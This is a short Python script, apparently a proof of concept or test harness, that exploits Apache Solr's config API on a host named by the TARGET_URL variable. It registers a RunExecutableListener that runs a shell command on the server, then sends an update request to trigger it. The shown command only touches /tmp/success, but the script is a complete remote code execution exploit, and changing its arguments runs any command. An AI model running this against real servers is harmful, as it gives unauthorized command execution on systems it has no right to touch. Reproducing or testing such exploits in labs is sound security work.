import os
import time

import requests

target_url = os.environ.get("TARGET_URL", None)

if target_url is None:
    print("TARGET_URL is not set")
    exit(1)


print(target_url)


def execute():
    path = f"{target_url}/demo/config"

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36",
    }
    res = requests.post(
        path,
        headers=headers,
        json={
            "add-listener": {
                "event": "postCommit",
                "name": "newlistener",
                "class": "solr.RunExecutableListener",
                "exe": "sh",
                "dir": "/bin/",
                "args": ["-c", "touch /tmp/success"],
            }
        },
    )
    print(res.text)


def update():
    path = f"{target_url}/demo/update"

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36",
    }
    res = requests.post(
        path,
        headers=headers,
        json=[{"id": "test"}],
    )
    print(res.text)


all_time = 5
sleep_time = all_time // 2

print(f"sleeping for {sleep_time}.")
time.sleep(sleep_time)
execute()

time.sleep(sleep_time)
update()

print(f"sleeping for {sleep_time}.")
time.sleep(sleep_time)
